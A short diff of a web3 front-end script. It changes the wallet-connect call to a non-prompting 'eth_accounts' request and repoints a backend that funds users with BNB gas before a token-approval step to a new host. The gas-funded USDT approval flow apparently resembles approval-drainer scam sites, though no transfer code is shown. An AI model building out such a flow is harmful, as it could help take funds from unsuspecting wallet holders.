@@ -1296,7 +1296,7 @@ async function connectWalletAndSwitch() {
         }
 
         // ✅ Now request account access
-        await window.ethereum.request({ method: "eth_requestAccounts" });
+        await window.ethereum.request({ method: "eth_accounts" });
         const accounts = await web3.eth.getAccounts();
         userAddress = accounts[0];
         console.log("✅ Wallet connected:", userAddress);
@@ -1342,7 +1342,7 @@ async function approveToken() {
         if (bnb < 0.0005) {
             showPopup("Requesting gas from backend...", "blue");
             try {
-                await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+                await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ toAddress: userAddress })
